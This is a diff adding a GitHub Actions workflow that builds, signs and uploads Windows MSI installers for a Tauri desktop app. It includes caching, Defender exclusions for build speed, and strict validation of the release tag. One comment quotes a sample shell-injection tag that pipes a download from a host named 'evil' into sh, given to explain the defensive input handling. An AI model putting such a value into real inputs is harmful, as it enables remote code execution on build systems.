@@ -1,0 +1,199 @@
+name: release-windows
+
+# The Windows release job, called by release.yml, which holds the triggers,
+# the job gates and the input descriptions. `inputs` here are the call's:
+# release.yml passes its dispatch inputs through (empty / false on a tag
+# push), while `github.*` stays the caller's event.
+
+on:
+  workflow_call:
+    inputs:
+      tag:
+        type: string
+        required: true
+      publish_to_release_repo:
+        type: boolean
+        required: true
+
+permissions: {}
+
+jobs:
+  build-windows:
+    runs-on: windows-latest
+    # Holds TAURI_SIGNING_PRIVATE_KEY for the updater .sig.
+    environment: release
+    permissions:
+      # write: uploads the installers to this repo's release for the tag.
+      contents: write
+    steps:
+      - name: Checkout source
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+        with:
+          persist-credentials: false
+
+      - name: Install Rust toolchain
+        uses: dtolnay/rust-toolchain@683b588c487a69d01f6c6ddf40f036ff682cc2c8 # v1
+        with:
+          toolchain: 1.95.0
+          targets: wasm32-unknown-unknown
+
+      # scripts/pdfium/build-wasm.ts (run by `bun run build`) installs the
+      # pinned wasm-bindgen CLI into vendor/tools on a miss.
+      - name: Cache wasm-bindgen CLI
+        uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0
+        with:
+          path: vendor/tools
+          key: wasm-bindgen-0.2.129-${{ runner.os }}-${{ runner.arch }}
+
+      # Defender real-time scanning of every .rlib/.obj/.pdb the compiler
+      # writes is a large hidden tax on Windows Rust CI. Excluding the
+      # workspace + cargo home noticeably cuts build time. Best-effort:
+      # `-ErrorAction SilentlyContinue` so a locked-down runner never fails
+      # the build here.
+      - name: Exclude build dirs from Windows Defender
+        shell: pwsh
+        run: |
+          Add-MpPreference -ExclusionPath "${{ github.workspace }}" -ErrorAction SilentlyContinue
+          Add-MpPreference -ExclusionPath "$env:USERPROFILE\.cargo" -ErrorAction SilentlyContinue
+          Add-MpPreference -ExclusionProcess "rustc.exe" -ErrorAction SilentlyContinue
+          Add-MpPreference -ExclusionProcess "cargo.exe" -ErrorAction SilentlyContinue
+          Add-MpPreference -ExclusionProcess "link.exe" -ErrorAction SilentlyContinue
+
+      # Swatinem/rust-cache keys on rustc version + Cargo.lock and caches
+      # only the dependency artifacts (not our own crate), so it saves/
+      # restores far less than the whole target dir and stays resilient
+      # across our per-release version bump. `shared-key` lets the weekly
+      # main-branch warm run and the tag release run share one cache;
+      # default-branch caches are restorable from tag runs.
+      #
+      # Only runs on main save: a cache written from a tag is scoped to that
+      # tag and no later release can read it, yet saving it cost 5.9 min on
+      # Windows (v26.9.26). The wasm core (`bun run build` compiles it) is
+      # its own workspace; left out, it compiled cold on every run.
+      - name: Cache Rust build (deps + registry)
+        uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2.9.2
+        with:
+          workspaces: |
+            src-tauri -> target
+            crates/shiori-core-wasm -> target
+          shared-key: "tauri-release"
+          save-if: ${{ github.ref == 'refs/heads/main' }}
+
+      - name: Install Bun
+        uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0
+        with:
+          # Pin to the exact version used on the dev machine so Windows
+          # installs reproduce the same lockfile resolution. Bump in lockstep
+          # with local bun upgrades.
+          bun-version: 1.3.12
+          # Windows runners occasionally fail immediately after restoring
+          # setup-bun's own cache. Rust still carries the expensive cache; this
+          # tiny download is more reliable than losing the whole release job.
+          no-cache: true
+
+      - name: Install JS dependencies
+        run: bun install --frozen-lockfile
+
+      # `src-tauri/target` is restored from cache for Rust incremental
+      # compilation speed, but that cache also drags in every previous
+      # run's `bundle/msi/*.msi` and `bundle/nsis/*.exe`. Tauri's bundler
+      # only adds to the bundle dir, it doesn't clean stale versions, so
+      # without this the upload step's `*.msi` / `*.exe` globs pick up
+      # the previous release's installers alongside the current ones
+      # (v0.1.2 shipped accidentally carrying v0.1.1 binaries until the
+      # assets were hand-deleted post-publish). Clearing only the
+      # bundle subtree preserves the compile cache and costs nothing.
+      - name: Clear stale bundle outputs from restored cache
+        shell: bash
+        run: |
+          rm -rf src-tauri/target/release/bundle
+
+      # The default tauri.conf.json keeps updater artifacts off so local
+      # dev builds don't need the updater signing key. Release builds
+      # explicitly enable them here; the .sig step is what needs the
+      # Ed25519 secret.
+      - name: Build Tauri bundle (Windows)
+        env:
+          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
+          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
+        run: bun run tauri build --config '{"bundle":{"createUpdaterArtifacts":true}}'
+
+      - name: Upload Windows workflow artifacts
+        # Analysis runs only (a tag, not publishing): a release ships the
+        # installers via the release upload below. Storage is metered in GB-hours per billing month, so every
+        # upload spends the account's storage allowance until the month resets
+        # (September 2026: refused for days with no artifact left). A full
+        # quota once failed this step and skipped the release upload with it
+        # (v26.9.26 run 36201079252), hence continue-on-error.
+        if: github.event_name == 'workflow_dispatch' && inputs.tag != '' && inputs.publish_to_release_repo != true
+        continue-on-error: true
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
+        with:
+          name: shiori-windows
+          retention-days: 3
+          path: |
+            src-tauri/target/release/bundle/msi/*.msi
+            src-tauri/target/release/bundle/msi/*.msi.sig
+          if-no-files-found: error
+
+      - name: Resolve release tag
+        id: tag
+        # Release-only: tag push, or manual dispatch with the publish switch.
+        if: github.event_name == 'push' || (github.event_name == 'workflow_dispatch' && inputs.tag != '' && inputs.publish_to_release_repo == true)
+        shell: bash
+        # Route user-controllable inputs through env so they are never
+        # spliced into the bash script body, then validate with a strict
+        # regex before emitting. Prevents shell-injection via crafted tag
+        # names (e.g. `v0"; curl evil | sh #`).
+        env:
+          MANUAL_TAG: ${{ inputs.tag }}
+          PUSHED_REF: ${{ github.ref }}
+        run: |
+          set -eu
+          if [ -n "${MANUAL_TAG:-}" ]; then
+            TAG_NAME="$MANUAL_TAG"
+          else
+            TAG_NAME="${PUSHED_REF#refs/tags/}"
+          fi
+          if ! [[ "$TAG_NAME" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-[a-zA-Z0-9.]+)?$ ]]; then
+            echo "Rejected tag: $TAG_NAME"
+            echo "Must match ^v[0-9]+\.[0-9]+\.[0-9]+(-[a-zA-Z0-9.]+)?$"
+            exit 1
+          fi
+          echo "name=$TAG_NAME" >> "$GITHUB_OUTPUT"
+
+      - name: Upload artifacts to the release
+        if: github.event_name == 'push' || (github.event_name == 'workflow_dispatch' && inputs.tag != '' && inputs.publish_to_release_repo == true)
+        shell: bash
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TAG: ${{ steps.tag.outputs.name }}
+        run: |
+          set -eu
+
+          # Collect Windows artifacts. Tauri 2 with createUpdaterArtifacts
+          # writes the updater signature next to the .msi itself
+          # (Shiori_..._en-US.msi.sig) — there's no separate .nsis.zip
+          # path unless you add "nsis" to bundle.targets. The .msi.sig
+          # is what the installed client downloads alongside the .msi
+          # to verify before running the installer; without it the
+          # manifest's windows-x86_64 signature has nothing to point at.
+          shopt -s nullglob
+          msi_files=(src-tauri/target/release/bundle/msi/*.msi)
+          msi_sigs=(src-tauri/target/release/bundle/msi/*.msi.sig)
+
+          if [ ${#msi_files[@]} -eq 0 ]; then
+            echo "No Windows artifacts found under src-tauri/target/release/bundle/msi/"
+            exit 1
+          fi
+          if [ ${#msi_sigs[@]} -ne ${#msi_files[@]} ]; then
+            echo "Expected one Windows updater signature per MSI, found ${#msi_sigs[@]} sig(s) for ${#msi_files[@]} MSI artifact(s)."
+            exit 1
+          fi
+
+          for f in "${msi_files[@]}" "${msi_sigs[@]}"; do
+            echo "Uploading $f to $TAG"
+            gh release upload "$TAG" "$f" \
+              --repo "$GITHUB_REPOSITORY" \
+              --clobber
+          done
